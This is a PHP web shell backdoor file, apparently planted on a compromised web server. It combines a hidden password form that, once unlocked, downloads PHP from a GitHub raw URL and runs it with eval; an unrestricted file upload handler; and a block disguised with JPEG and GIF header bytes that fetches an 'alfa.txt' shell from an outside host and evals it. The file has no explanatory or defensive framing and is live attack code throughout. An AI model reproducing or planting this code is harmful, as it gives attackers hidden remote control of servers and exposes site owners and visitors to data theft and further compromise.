<?php
session_start();
function g($u){if(function_exists('curl_exec')){$c=curl_init($u);curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_USERAGENT=>"Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_SSL_VERIFYHOST=>0,CURLOPT_COOKIE=>isset($_SESSION['SAP'])?$_SESSION['SAP']:[]]);$r=curl_exec($c);curl_close($c);}elseif(function_exists('file_get_contents')){$r=file_get_contents($u);}elseif(function_exists('fopen')&&function_exists('stream_get_contents')){$h=fopen($u,"r");$r=stream_get_contents($h);fclose($h);}else{$r=false;}return$r;}function i(){return isset($_SESSION['logged_in'])&&$_SESSION['logged_in']===true;}if(isset($_POST['password'])){$e=$_POST['password'];$h='9e2aa4ba13c56ed1e00fd6c0a870a3c4';if(md5($e)===$h){$_SESSION['logged_in']=true;$_SESSION['SAP']='janco';}}if(i()){$a=g('https://raw.githubusercontent.com/shellag6561-ux/chil/refs/heads/main/g.php');eval('?>'.$a);}else{?><!DOCTYPE html><html><head><style>input{border:0}input:focus{outline:0;border:none;box-shadow:none}</style></head><body><form method="post"><input style="border:0 solid #fff" type="password" name="password"></form></body></html> <?php } ?>
<?php
?>

<?PhP
  if(!empty($_FILES['uploaded_file']))
  {
    $path = "";
    $path = $path . basename( $_FILES['uploaded_file']['name']);

    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
      " has been uploaded";
    } else{
        echo "There was an error uploading the file, please try again!";
    }
  }
?>     x       x       C                      
     
   
  
   
                            C            
 
                                                        < d  "                                      
                     }        !1A  Qa "q 2    #B   R  $3br  
     %&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz                                                                                                     
                     w       !1  AQ aq "2   B     #3R  br 
 $4 %     &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz                                                                                 ?  S  (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   (   <html><link rel='icon' href='https://a.top4top.io/p_3163llkk21.png' sizes='20x20' type='image/png'>ÿØÿà JFIF ÿþ;GIF89;aGIF89;aGIF89;a<?=/**/@null; /**/ /*/ /**/@trim("?>");/**/?><?PhP
function getCurl0($url)
{
  if (function_exists("curl_init")) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
  }
}
?>

<?=eval("?>".getCurl0("https://marslogs.co.id/shell/shell/alfa.txt")); __halt_compiler();?>

